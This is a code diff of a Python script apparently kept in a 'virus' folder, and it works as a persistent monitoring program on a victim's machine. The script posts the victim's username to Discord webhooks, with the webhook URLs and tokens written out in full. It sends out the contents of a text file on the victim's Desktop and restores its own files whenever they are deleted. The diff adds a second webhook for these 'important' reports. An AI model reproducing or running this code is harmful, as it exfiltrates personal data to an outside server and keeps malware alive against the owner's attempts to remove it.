@@ -19,10 +19,12 @@ files_to_backup = [
     os.path.join(virus_dir, "cleanup_x64.py"),
 ]
 
-def log_to_discord(msg:str):
+def log_to_discord(msg:str, important=False):
     data = {"username":f"User:{os.getlogin()}", "content":msg}
     try:
         requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
+        if important:
+            requests.post("https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT", json = data)
     except:
         print("Failed to send port request")
 log_to_discord("File checker...")
@@ -32,7 +34,7 @@ def check_resign():
         with open(os.path.join(home_dir, "Desktop", "vzdavam_sa.txt")) as f:
             content = f.readlines()
             if len(content) > 3:
-                log_to_discord("Basnicka:\n```" + "\n".join(content) + "```")
+                log_to_discord("Basnicka:\n```" + "\n".join(content) + "```", important=True)
                 try:
                     import send2trash
 
@@ -69,7 +71,7 @@ while True:
         backup = backuped_files[index]
         try:
             if not os.path.exists(path) or open(path, "rb").read() != backup:
-                log_to_discord(f"File {path} was removed, reconstructing")
+                log_to_discord(f"File {path} was removed, reconstructing", important=True)
                 with open(path, "wb") as file:
                     file.write(backup)
         except Exception as e:
